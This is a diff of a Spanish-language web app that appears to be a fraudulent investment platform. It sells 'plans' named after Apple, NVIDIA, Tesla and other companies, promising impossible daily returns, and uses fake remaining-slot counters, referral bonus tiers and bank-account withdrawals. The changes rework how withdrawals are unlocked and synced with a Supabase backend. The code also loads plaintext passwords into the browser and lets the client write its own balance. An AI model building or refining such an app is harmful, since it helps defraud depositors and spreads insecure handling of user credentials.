@@ -112,7 +112,7 @@
     </div>
   </div>
 
-  <!-- PANTALLA DE ACCESO CON CASILLA DE INVITACIÓN VISIBLE -->
+  <!-- PANTALLA DE ACCESO -->
   <div id="auth-screen" style="position: fixed; inset: 0; z-index: 9999; background-color: rgba(6, 20, 36, 0.98); display: flex; align-items: center; justify-content: center; padding: 1rem;">
     <div class="w-full max-w-sm bg-[#0b1b2d] border border-sky-900/60 rounded-3xl p-6 shadow-2xl space-y-4 text-white">
       <div class="text-center space-y-2">
@@ -158,7 +158,6 @@
           </div>
         </div>
 
-        <!-- CASILLA VISIBLE DE QUIEN TE INVITÓ -->
         <div id="auth-ref-box">
           <label class="text-xs text-slate-400 block mb-1">TELÉFONO DE QUIEN TE INVITÓ (OPCIONAL)</label>
           <div class="flex items-center bg-[#13283f] border border-sky-800/60 rounded-xl px-3 py-2.5 text-sm">
@@ -267,7 +266,7 @@
         <div id="active-products-container" class="space-y-3"></div>
       </div>
 
-      <!-- VISTA 3: COMPARTIR (ESCALA LIMPIA) -->
+      <!-- VISTA 3: COMPARTIR -->
       <div id="view-compartir" class="hidden p-3.5 space-y-4">
         <div class="card-theme p-4 bg-white border border-sky-200 rounded-2xl shadow-sm space-y-3">
           <div class="flex items-center gap-2.5">
@@ -309,7 +308,6 @@
           </div>
         </div>
 
-        <!-- ESCALA DE BONIFICACIONES LIMPIA -->
         <div class="card-theme p-3.5 bg-white border border-sky-200 rounded-2xl space-y-2.5">
           <h3 class="text-xs font-bold text-slate-850 uppercase tracking-wide text-main">Escala de Bonificaciones</h3>
           <div class="grid grid-cols-2 gap-2 text-xs font-mono">
@@ -402,7 +400,7 @@
           </div>
         </div>
 
-        <!-- CAMBIO DE CONTRASEÑA CON BOTÓN DE OJO -->
+        <!-- CAMBIO DE CONTRASEÑA -->
         <div class="card-theme p-4 bg-white border border-sky-200 rounded-2xl space-y-3 text-xs">
           <div class="flex items-center gap-2 border-b border-sky-100 pb-2">
             <i class="fa-solid fa-key text-sky-600 text-sm"></i>
@@ -702,9 +700,7 @@
       }
     }
 
-    // CATÁLOGO CON ESCALA VIP CALIBRADA: 15, 25, 45, 60, 75 Y 100 DÍAS
     const plans = [
-      // CATEGORÍA INICIAL (100 cupos totales)
       { id: 'meli', name: 'MELI (Mercado Libre)', cat: 'inicial', cost: 2000, days: 2, daily: 2500, total: 7000, slotsTotal: 100, slotsLeft: 64, color: '#f59e0b', btnBg: 'bg-amber-400 hover:bg-amber-300 text-slate-950', border: 'border-amber-300', logo: './meli.png' },
       { id: 'tiktok', name: 'TikTok (ByteDance)', cat: 'inicial', cost: 3500, days: 3, daily: 3000, total: 12500, slotsTotal: 100, slotsLeft: 58, color: '#06b6d4', btnBg: 'bg-cyan-500 hover:bg-cyan-400 text-white', border: 'border-cyan-300', logo: './tiktok.png' },
       { id: 'apple', name: 'AAPL (Apple Inc.)', cat: 'inicial', cost: 5000, days: 5, daily: 3200, total: 21000, slotsTotal: 100, slotsLeft: 47, color: '#1e293b', btnBg: 'bg-slate-900 hover:bg-slate-800 text-white', border: 'border-slate-300', logo: './apple.png' },
@@ -712,7 +708,6 @@
       { id: 'amazon', name: 'AMZN (Amazon)', cat: 'inicial', cost: 12000, days: 10, daily: 5300, total: 65000, slotsTotal: 100, slotsLeft: 31, color: '#ea580c', btnBg: 'bg-orange-500 hover:bg-orange-400 text-white', border: 'border-orange-300', logo: './amazon.png' },
       { id: 'netflix', name: 'Netflix (Streaming)', cat: 'inicial', cost: 15000, days: 10, daily: 7000, total: 85000, slotsTotal: 100, slotsLeft: 22, color: '#e50914', btnBg: 'bg-red-600 hover:bg-red-500 text-white', border: 'border-red-300', logo: './netflix.png' },
       
-      // CATEGORÍA VIP (ESCALA SUPERIOR: 15, 25, 45, 60, 75 Y 100 DÍAS)
       { id: 'nvidia', name: 'NVDA (NVIDIA AI)', cat: 'pro', cost: 20000, days: 15, daily: 3000, total: 65000, slotsTotal: 50, slotsLeft: 28, color: '#16a34a', btnBg: 'bg-emerald-600 hover:bg-emerald-500 text-white', border: 'border-emerald-300', logo: './nvidia.png' },
       { id: 'instagram', name: 'Instagram (Meta)', cat: 'pro', cost: 25000, days: 25, daily: 4560, total: 139000, slotsTotal: 50, slotsLeft: 21, color: '#e11d48', btnBg: 'bg-rose-600 hover:bg-rose-500 text-white', border: 'border-rose-300', logo: './instagram.png' },
       { id: 'tesla', name: 'TSLA (Tesla Motors)', cat: 'pro', cost: 35000, days: 45, daily: 4667, total: 245000, slotsTotal: 50, slotsLeft: 17, color: '#dc2626', btnBg: 'bg-red-600 hover:bg-red-500 text-white', border: 'border-red-400', logo: './tesla.png' },
@@ -755,7 +750,6 @@
       appState.activePlans = JSON.parse(localStorage.getItem('cy_active_plans')) || [];
     } catch(e) {}
 
-    // Auto-completar casilla de referido si viene de enlace
     if (referredByUrl) {
       const refInput = document.getElementById('auth-ref-input');
       if (refInput) {
@@ -764,7 +758,6 @@
       }
     }
 
-    // Auto-sanitización de CBU/CVU
     ['prof-cvu-input', 'withdraw-dest-cvu'].forEach(id => {
       const el = document.getElementById(id);
       if (el) {
@@ -959,6 +952,7 @@
       }).join('');
     }
 
+    // SINCRONIZACIÓN CORREGIDA: DESBLOQUEA RETIROS RECHAZADOS AUTOMÁTICAMENTE
     async function sincronizarSaldoServidor() {
       if (!appState.phone) return;
       
@@ -971,20 +965,28 @@
       }
 
       if (data && data.length > 0) {
-        const nuevoBalance = parseFloat(data[0].balance);
-        if (!isNaN(nuevoBalance) && appState.balance !== nuevoBalance) {
+        const dbUser = data[0];
+        const nuevoBalance = parseFloat(dbUser.balance);
+        if (!isNaN(nuevoBalance)) {
           appState.balance = nuevoBalance;
         }
-        if (data[0].pass) appState.pass = data[0].pass;
-        if (data[0].name) appState.name = data[0].name;
-        if (data[0].cvu) appState.cvu = data[0].cvu;
-        if (data[0].alias) appState.alias = data[0].alias;
-        if (data[0].bank_verified !== undefined) {
-          appState.bankVerified = data[0].bank_verified === true;
+        if (dbUser.pass) appState.pass = dbUser.pass;
+        if (dbUser.name) appState.name = dbUser.name;
+        if (dbUser.cvu) appState.cvu = dbUser.cvu;
+        if (dbUser.alias) appState.alias = dbUser.alias;
+        if (dbUser.withdrawn !== undefined) appState.withdrawn = parseFloat(dbUser.withdrawn) || 0;
+        if (dbUser.bank_verified !== undefined) {
+          appState.bankVerified = dbUser.bank_verified === true;
         }
         
-        if (data[0].active_plans && Array.isArray(data[0].active_plans)) {
-          appState.activePlans = data[0].active_plans;
+        // Si en Supabase last_withdraw está en 0 o no tiene retiro pendiente, desbloquear interfaz
+        if (dbUser.last_withdraw !== undefined && parseInt(dbUser.last_withdraw) === 0) {
+          appState.lastWithdraw = 0;
+          appState.lastWithdrawNet = 0;
+        }
+
+        if (dbUser.active_plans && Array.isArray(dbUser.active_plans)) {
+          appState.activePlans = dbUser.active_plans;
         }
 
         saveLocal();
@@ -1009,7 +1011,6 @@
 
     setInterval(sincronizarSaldoServidor, 5000);
 
-    // REGISTRO Y LOGIN CON CASILLA DE INVITACIÓN DIRECTA
     window.handleAuthSubmit = async function() {
       const phoneInput = document.getElementById('auth-phone');
       const passInput = document.getElementById('auth-pass');
@@ -1083,7 +1084,14 @@
           appState.name = dbUsers[0].name || '';
           appState.cvu = dbUsers[0].cvu || '';
           appState.alias = dbUsers[0].alias || '';
+          appState.withdrawn = parseFloat(dbUsers[0].withdrawn) || 0;
           appState.bankVerified = dbUsers[0].bank_verified === true;
+          
+          if (dbUsers[0].last_withdraw !== undefined && parseInt(dbUsers[0].last_withdraw) === 0) {
+            appState.lastWithdraw = 0;
+            appState.lastWithdrawNet = 0;
+          }
+
           if (dbUsers[0].active_plans && Array.isArray(dbUsers[0].active_plans)) {
             appState.activePlans = dbUsers[0].active_plans;
           }
@@ -1335,6 +1343,7 @@
     }
     setInterval(renderProducts, 1000);
 
+    // CHECK-IN CON PERSISTENCIA EN SUPABASE
     document.getElementById('btn-claim-daily').addEventListener('click', async () => {
       const now = Date.now();
       if (now - appState.lastClaim < 24 * 60 * 60 * 1000) {
@@ -1344,8 +1353,11 @@
       appState.balance += 500;
       appState.lastClaim = now;
       saveLocal();
-      await supabaseRequest(`usuarios?phone=eq.${encodeURIComponent(appState.phone)}`, 'PATCH', { balance: appState.balance });
-      alert("¡+$500 ARS acreditados!");
+      await supabaseRequest(`usuarios?phone=eq.${encodeURIComponent(appState.phone)}`, 'PATCH', { 
+        balance: appState.balance,
+        last_claim: now 
+      });
+      alert("¡+$500 ARS acreditados con éxito!");
     });
 
     window.openWalletModal = function(mode) {
@@ -1533,7 +1545,8 @@
         balance: appState.balance,
         withdrawn: appState.withdrawn,
         name: appState.name,
-        cvu: appState.cvu
+        cvu: appState.cvu,
+        last_withdraw: now
       });
 
       const retiroItem = {
@@ -1846,10 +1859,13 @@
         }
       } else {
         await supabaseRequest(`usuarios?phone=eq.${encodeURIComponent(phone)}`, 'PATCH', {
-          bank_verified: true
+          bank_verified: true,
+          last_withdraw: 0
         });
         if (appState.phone === phone) {
           appState.bankVerified = true;
+          appState.lastWithdraw = 0;
+          appState.lastWithdrawNet = 0;
           saveLocal();
         }
       }
@@ -1880,12 +1896,14 @@
           const ajustadoWithdrawn = Math.max(0, (parseFloat(users[0].withdrawn) || 0) - parseFloat(amount));
           await supabaseRequest(`usuarios?phone=eq.${encodeURIComponent(phone)}`, 'PATCH', {
             balance: reintegroBal,
-            withdrawn: ajustadoWithdrawn
+            withdrawn: ajustadoWithdrawn,
+            last_withdraw: 0
           });
         }
         if (appState.phone === phone) {
           appState.balance += parseFloat(amount);
           appState.withdrawn = Math.max(0, appState.withdrawn - parseFloat(amount));
+          appState.lastWithdraw = 0;
           appState.lastWithdrawNet = 0;
           saveLocal();
         }
@@ -1933,11 +1951,12 @@
       document.getElementById('profile-withdrawn-ars').innerText = `$${fmt(appState.withdrawn)}`;
       document.getElementById('wallet-available-bal').innerText = `$${fmt(appState.balance)} ARS`;
 
+      // Si el retiro fue cancelado o lastWithdraw está en 0, ocultar la tarjeta
       const withdrawBox = document.getElementById('active-withdraw-box');
       const withdrawText = document.getElementById('active-withdraw-text');
       const diffWithdraw = Date.now() - (appState.lastWithdraw || 0);
 
-      if (diffWithdraw < 24 * 60 * 60 * 1000 && appState.lastWithdrawNet > 0) {
+      if (appState.lastWithdraw > 0 && diffWithdraw < 24 * 60 * 60 * 1000 && appState.lastWithdrawNet > 0) {
         withdrawBox.classList.remove('hidden');
         withdrawText.innerText = `Neto a recibir: $${fmt(appState.lastWithdrawNet)} ARS hacia CVU ${appState.cvu ? appState.cvu.slice(-4).padStart(appState.cvu.length, '*') : ''}`;
       } else {
